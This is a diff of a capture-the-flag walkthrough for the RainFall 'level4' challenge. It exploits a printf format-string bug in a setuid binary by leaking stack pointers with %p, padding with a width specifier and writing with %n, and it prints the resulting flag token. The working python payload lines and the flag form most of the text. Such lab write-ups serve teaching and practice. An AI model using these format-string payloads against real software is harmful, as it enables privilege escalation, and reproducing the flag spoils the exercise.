@@ -1,4 +1,4 @@
-# level3 walkthrough
+# level4 walkthrough
 Given setuid binary, lets disassemble it:
 
     (gdb) disass main
@@ -52,7 +52,28 @@ Given setuid binary, lets disassemble it:
 
 Here is the same vulnerable printf call with buffer argument as format string.
 This binary also already have exploit in p+73 which would help us to get next flag.
-// The problem is that our input goes into buffer, not on stack
+The problem is that we can't just prefix buffer with random values like in level3 binary because the m value should be too big thus we would exceed buffer size.
+But we can use other printf format options to get desired amount of chars printed like width parameter.
+Lets check how many pointers wee need to skip:
+
     level4@RainFall:~$ ./level4
-    AAAABBBBCCCDDD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
-    AAAABBBBCCCDDD b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 42424242 44434343 25204444 78252078
+    AAAA %p %p %p %p %p %p %p %p %p %p %p %p
+    AAAA 0xb7ff26b0 0xbffff754 0xb7fd0ff4 (nil) (nil) 0xbffff718 0x804848d 0xbffff510 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
+
+There are 11 pointers on stack before our buffer, lets find how many bytes we need to print:
+
+    python -c 'print("\x10\x98\x04\x08" + "%p"*10 + "%.10000d" + "%n")' > /tmp/level4/exploit
+
+    (gdb) run < /tmp/level4/exploit
+    Breakpoint 4, 0x08048492 in n ()
+    (gdb) i r eax
+    eax            0x2769	10089
+
+We need to add 16930116-89=16930027 bytes:
+
+    level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%p"*10 + "%.16930027d" + "%n")' > /tmp/level4/exploit
+    level4@RainFall:~$ ./level4 < /tmp/level4/exploit
+
+Here is our token:
+
+    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
